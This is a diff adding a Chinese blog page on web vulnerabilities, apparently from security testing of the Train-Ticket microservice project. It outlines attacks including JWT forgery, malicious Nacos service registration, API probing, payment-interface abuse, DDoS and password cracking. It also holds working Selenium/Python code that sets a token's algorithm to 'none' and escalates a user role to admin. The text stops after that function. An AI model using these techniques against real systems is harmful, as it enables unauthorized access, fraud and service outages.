@@ -1,0 +1,937 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/avatar.jpeg">
+  <link rel="icon" href="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/avatar.jpeg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ltyzzz">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Web安全漏洞1. 常见Web安全漏洞 篡改Token校验机制  措施：  从前端网站中获取Token，并通过base64解密得到JSON字符串 从JSON字符串中查看是否有敏感信息 暴力破解Token，得到Token的密钥，反向生成新的Token   举例： 123456789101112131415161718192021222324252627282930@Componentpublic c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全漏洞">
+<meta property="og:url" content="https://ltyzzzxxx.github.io/2023/02/06/Web%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="ltyzzz&#39;s Blog">
+<meta property="og:description" content="Web安全漏洞1. 常见Web安全漏洞 篡改Token校验机制  措施：  从前端网站中获取Token，并通过base64解密得到JSON字符串 从JSON字符串中查看是否有敏感信息 暴力破解Token，得到Token的密钥，反向生成新的Token   举例： 123456789101112131415161718192021222324252627282930@Componentpublic c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/web-security.jpg">
+<meta property="article:published_time" content="2023-02-06T08:03:30.000Z">
+<meta property="article:modified_time" content="2023-02-06T08:11:19.259Z">
+<meta property="article:author" content="ltyzzz">
+<meta property="article:tag" content="Token">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="Selenium">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/web-security.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Web安全漏洞 - ltyzzz&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ltyzzzxxx.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ltyzzz&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/remark/">
+                <i class="iconfont icon-pen"></i>
+                留言板
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/banner.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Web安全漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-06 16:03" pubdate>
+          2023年2月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          54 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Web安全漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Web安全漏洞"><a href="#Web安全漏洞" class="headerlink" title="Web安全漏洞"></a>Web安全漏洞</h1><h2 id="1-常见Web安全漏洞"><a href="#1-常见Web安全漏洞" class="headerlink" title="1. 常见Web安全漏洞"></a>1. 常见Web安全漏洞</h2><ol>
+<li><p>篡改Token校验机制</p>
+<ul>
+<li><p>措施：</p>
+<ol>
+<li>从前端网站中获取Token，并通过base64解密得到JSON字符串</li>
+<li>从JSON字符串中查看是否有敏感信息</li>
+<li>暴力破解Token，得到Token的密钥，反向生成新的Token</li>
+</ol>
+</li>
+<li><p>举例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JWTProvider</span> &#123;<br>	<span class="hljs-comment">// 密钥过于明显，显式地写在代码中。这种安全漏洞需要通过代码检测工具提前检测。</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;secret&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-variable">validityInMilliseconds</span> <span class="hljs-operator">=</span> <span class="hljs-number">3600000</span>;<br><br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        secretKey = Base64.getEncoder().encodeToString(secretKey.getBytes());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createToken</span><span class="hljs-params">(User user)</span> &#123;<br><br>        <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> Jwts.claims().setSubject(user.getUsername());<br>        <span class="hljs-comment">// 用户所属的角色信息过于敏感，猜测可通过暴力破解进行篡改</span><br>        claims.put(InfoConstant.ROLES, user.getRoles()); <br>        claims.put(InfoConstant.ID, user.getUserId());<br><br>        <span class="hljs-type">Date</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">validate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(now.getTime() + validityInMilliseconds);<br><br>        <span class="hljs-keyword">return</span> Jwts.builder()<br>                .setClaims(claims)<br>                .setIssuedAt(now)<br>                .setExpiration(validate)<br>                .signWith(SignatureAlgorithm.HS256, secretKey)<br>                .compact();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>造成的问题：</p>
+<ul>
+<li>攻击者基本可以获得系统的所有操作权限</li>
+</ul>
+</li>
+<li><p>预防或解决方案：</p>
+<ul>
+<li>检测Token校验的代码</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>往Nacos恶意注入微服务</p>
+<ul>
+<li><p>措施：</p>
+<ol>
+<li>需要获取到对应微服务系统Nacos所在的服务器地址、账号与密码（可尝试使用默认密码）</li>
+<li>新创建一个SpringBoot项目，配置对应的Nacos。启动该项目，即可注册成功。</li>
+</ol>
+</li>
+<li><p>造成的问题：</p>
+<ul>
+<li>从内部攻击其它微服务而不被管理者察觉</li>
+</ul>
+</li>
+<li><p>预防或解决方案：</p>
+<ul>
+<li><p>确保Nacos的账号与密码不泄漏</p>
+</li>
+<li><p>确保Nacos服务器地址不泄漏</p>
+</li>
+<li><p>自动检测配置文件中有关Nacos的配置信息</p>
+</li>
+<li><p>在向Nacos注册服务时，记录注册用户的IP地址，做到有效溯源</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>配置文件中误填了服务器地址、</p>
+<p>数据库地址、数据库账号与密码等</p>
+<ul>
+<li><p>造成的问题：</p>
+<ul>
+<li>借助服务器恶意挖矿、删除数据库进行敲诈勒索</li>
+</ul>
+</li>
+<li><p>预防或解决方案：</p>
+<ul>
+<li>自动检测配置文件是否存在敏感信息</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>接口泄漏，攻击者从浏览器的路由路径猜测出对应的后端接口地址</p>
+<p>方法一：</p>
+<ol>
+<li>通过自动化脚本点击网站的各个页面，收集路径信息</li>
+<li>通过自动化脚本，拼接收集到的路径信息，以Get&#x2F;Post方式向目标服务器发送请求。</li>
+<li>从请求的Response中过滤出收到正确响应的请求 -&gt; 攻击切入点<ul>
+<li>正确响应指：得到正确的数据、没有被权限系统拦截、无常规报错</li>
+</ul>
+</li>
+</ol>
+<p>方法二：</p>
+<ol>
+<li>通过网页控制台过滤Network请求，即后端请求，收集信息</li>
+<li>向已收集的接口发送海量请求，若服务未做限流，将直接击穿服务器</li>
+</ol>
+</li>
+<li><p>DDos攻击</p>
+<ul>
+<li><p>很难通过人为的监测进行避免 或 从代码层面进行预防，一般情况只能购买DDos高防</p>
+</li>
+<li><p>统计模型和机器学习算法(例如神经网络，决策树和近邻算法)可用于分析网络流量并将流量模式分类为正常或DDoS攻击。你还可以搜索其他网络性能因素中的异常，例如设备CPU利用率或带宽使用情况。</p>
+</li>
+<li><p>检测异常ip，从请求入口进行封杀，但是一般DDos请求是无特征的，所以很难有十足把握确定请求是恶意请求</p>
+</li>
+<li><p>通过CDN将网站的静态内容分发到多个服务器，用户就近访问，提高速度。此时不可泄漏服务器源地址，否则前功尽弃</p>
+</li>
+</ul>
+</li>
+<li><p>安全接口校验降级</p>
+<ol>
+<li>Train-Ticket每个微服务下，对应有SecurityConfig配置类</li>
+<li>更改SecurityConfig配置类中的路径匹配角色校验代码，从管理员访问接口降级为任何人可访问的接口</li>
+<li>结合接口探测方式，即可访问成功</li>
+</ol>
+</li>
+<li><p>接口访问限流降级</p>
+<ol>
+<li>Train-Ticket对应的gateway-service中，配置了接口qps限流阈值</li>
+<li>更改接口qps限流阈值或剔除限流代码</li>
+<li>结合接口窥测与并发测试工具，可人为制造流量高峰，使服务瘫痪</li>
+<li>Train-Ticket未对异常流量做进一步处理（黑名单检查机制）</li>
+</ol>
+</li>
+<li><p>支付接口漏洞</p>
+<p>该支付接口未做额外安全校验，管理员与普通用户均可访问</p>
+<ol>
+<li>Train-Ticket对应的payment-service中，存在addMoney接口</li>
+<li>通过接口窥测方式获取到相应的接口路径</li>
+<li>通过普通用户登陆得到Token</li>
+<li>构造请求体，发送请求，实现增加金额</li>
+</ol>
+</li>
+<li><p>以服务注入形式进行攻击</p>
+<ol>
+<li>通过SpringBoot注册新的微服务到Train-Ticket中</li>
+<li>在新服务的内部创建新的接口，通过RestTemplete构造Http请求，发起RPC远程调用，调用其他微服务</li>
+</ol>
+</li>
+<li><p>脚本批量注册用户：薅羊毛</p>
+<ol>
+<li>Train-Ticket对应的auth-service中，存在createDefaultUser接口，管理员可以访问</li>
+<li>通过破解Token得到管理员权限</li>
+<li>用Python构建Http请求脚本以及用户信息，构造请求，访问该接口</li>
+</ol>
+</li>
+<li><p>DDos攻击</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ha3MrX/DDos-Attack">https://github.com/Ha3MrX/DDos-Attack</a></li>
+<li>通过该脚本发起DDos攻击，监控服务的内存、CPU、流量等指标</li>
+</ol>
+</li>
+<li><p>XSS攻击</p>
+<ol>
+<li>各类XSS攻击脚本 <a target="_blank" rel="noopener" href="https://github.com/boku7/XSS-Clientside-Attacks">https://github.com/boku7/XSS-Clientside-Attacks</a></li>
+<li>反射性XSS攻击：在前端代码中找到输入框的部分，尝试输入脚本</li>
+</ol>
+</li>
+<li><p>Python爬虫窃取用户信息</p>
+</li>
+<li><p>服务器密码破解</p>
+<ol>
+<li>通过Crunch和rtgen工具生成密码字典</li>
+<li>通过Hydra和Medusa工具暴力破解服务器密码</li>
+</ol>
+</li>
+</ol>
+<h2 id="2-JSON-Web-Token"><a href="#2-JSON-Web-Token" class="headerlink" title="2. JSON Web Token"></a>2. JSON Web Token</h2><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;姓名&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;张三&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;角色&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;管理员&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;到期时间&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2018年7月1日0点0分&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</p>
+<p>userID username role</p>
+<p>role &#x3D; user user</p>
+<p>role &#x3D; admin</p>
+<p><img src="https://www.wangbase.com/blogimg/asset/201807/bg2018072304.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>JWT由三个部分组成：</p>
+<ul>
+<li>Header（头部）</li>
+<li>Payload（负载）</li>
+<li>Signature（签名）</li>
+</ul>
+<p><img src="https://www.wangbase.com/blogimg/asset/201807/bg2018072303.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="2-1-Header"><a href="#2-1-Header" class="headerlink" title="2.1 Header"></a>2.1 Header</h3><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；<code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。</p>
+<h3 id="2-2-Payload"><a href="#2-2-Payload" class="headerlink" title="2.2 Payload"></a>2.2 Payload</h3><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
+<ul>
+<li>iss (issuer)：签发人</li>
+<li>exp (expiration time)：过期时间</li>
+<li>sub (subject)：主题</li>
+<li>aud (audience)：受众</li>
+<li>nbf (Not Before)：生效时间</li>
+<li>iat (Issued At)：签发时间</li>
+<li>jti (JWT ID)：编号</li>
+</ul>
+<p>定义私有字段</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p>
+<p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p>
+<h3 id="2-3-Signature"><a href="#2-3-Signature" class="headerlink" title="2.3 Signature"></a>2.3 Signature</h3><p>Signature 部分是对前两部分的签名，防止数据篡改。</p>
+<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">HMACSHA256(<br>  <span class="hljs-name">base64UrlEncode</span>(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +<br>  base64UrlEncode(<span class="hljs-name">payload</span>),<br>  secret)<br></code></pre></td></tr></table></figure>
+
+<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（<code>.</code>）分隔，就可以返回给用户。</p>
+<h3 id="2-4-具体用法"><a href="#2-4-具体用法" class="headerlink" title="2.4 具体用法"></a>2.4 具体用法</h3><p>存储在浏览器的LocalStorage中</p>
+<p>当前端发送的请求需要Token时，将其携带在请求头Authorization字段里</p>
+<h3 id="2-5-破解方式"><a href="#2-5-破解方式" class="headerlink" title="2.5 破解方式"></a>2.5 破解方式</h3><h4 id="2-5-1-降级加密"><a href="#2-5-1-降级加密" class="headerlink" title="2.5.1 降级加密"></a>2.5.1 降级加密</h4><p>现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。</p>
+<p>碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密，这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法， 所以肯定可以正常解密解析，从而绕过了算法限制。</p>
+<p>对于Train-Ticket项目，无需进行降级。其本身使用的便是HS256对称加密，只有一把公钥。</p>
+<h4 id="2-5-2-暴力破解"><a href="#2-5-2-暴力破解" class="headerlink" title="2.5.2 暴力破解"></a>2.5.2 暴力破解</h4><p>适用于HS256对称加密</p>
+<p>从LocalStorage中获取Token，通过Python脚本暴力破解，得到对应的公钥</p>
+<h4 id="2-5-3-置空加密"><a href="#2-5-3-置空加密" class="headerlink" title="2.5.3 置空加密"></a>2.5.3 置空加密</h4><p>从LocalStorage中获取Token，通过Base64解密得到JSON字符串</p>
+<p>将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p>
+<h2 id="3-Token置空破解"><a href="#3-Token置空破解" class="headerlink" title="3. Token置空破解"></a>3. Token置空破解</h2><p>Python脚本实现：用于自动化完成token破解与登陆</p>
+<ol>
+<li><p>引入selenium</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>创建全局的webdriver</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">wd = webdriver.Chrome()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自动登陆并获取Token</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_token</span>(<span class="hljs-params">username, password</span>):<br>    <span class="hljs-keyword">global</span> wd<br>    wd.get(<span class="hljs-string">&quot;http://10.249.238.10/client_login.html&quot;</span>)<br>    alertObject = wd.switch_to.alert<br>    alertObject.accept()<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># wd.find_element(value=&quot;flow_preserve_login_email&quot;).send_keys(username)</span><br>    <span class="hljs-comment"># time.sleep(2)</span><br>    <span class="hljs-comment"># wd.find_element(value=&quot;flow_preserve_login_password&quot;).send_keys(password)</span><br>    <span class="hljs-comment"># time.sleep(2)</span><br>    wd.find_element(value=<span class="hljs-string">&quot;client_login_button&quot;</span>).click()<br>    time.sleep(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">return</span> wd.execute_script(<span class="hljs-string">&#x27;return sessionStorage.getItem(&quot;client_token&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 破解Token篡改名字与权限</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_token</span>(<span class="hljs-params">token: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    ts = token.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    json1 = base64.b64decode(ts[<span class="hljs-number">0</span>])<br>    json1 = <span class="hljs-built_in">str</span>(json1)<br>    json1 = json1.replace(<span class="hljs-string">&quot;HS256&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>)<br>    <span class="hljs-comment"># print(ts[1])</span><br>    json2 = base64.b64decode(ts[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;==&quot;</span>)<br>    json2 = <span class="hljs-built_in">str</span>(json2)<br>    json2 = json2.replace(<span class="hljs-string">&quot;ROLE_USER&quot;</span>, <span class="hljs-string">&quot;ROLE_ADMIN&quot;</span>)<br>    json2 = json2.replace(<span class="hljs-string">&quot;fdse_microservice&quot;</span>, <span class="hljs-string">&quot;lty&quot;</span>)<br>    json1 = json1[json1.find(<span class="hljs-string">&#x27;&#123;&#x27;</span>):json1.find(<span class="hljs-string">&#x27;&#125;&#x27;</span>) + <span class="hljs-number">1</span>]<br>    json2 = json2[json2.find(<span class="hljs-string">&#x27;&#123;&#x27;</span>):json2.find(<span class="hljs-string">&#x27;&#125;&#x27;</span>) + <span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(json1)<br>    <span class="hljs-built_in">print</span>(json2)<br>    header = <span class="hljs-built_in">str</span>(base64.b64encode(json1.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    payload = <span class="hljs-built_in">str</span>(base64.b64encode(json2.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-built_in">print</span>(header + <span class="hljs-string">&#x27;.&#x27;</span> + payload + <span class="hljs-string">&#x27;.&#x27;</span> + ts[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> header + <span class="hljs-string">&#x27;.&#x27;</span> + payload + <span class="hljs-string">&#x27;.&#x27;</span> + ts[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure>
+
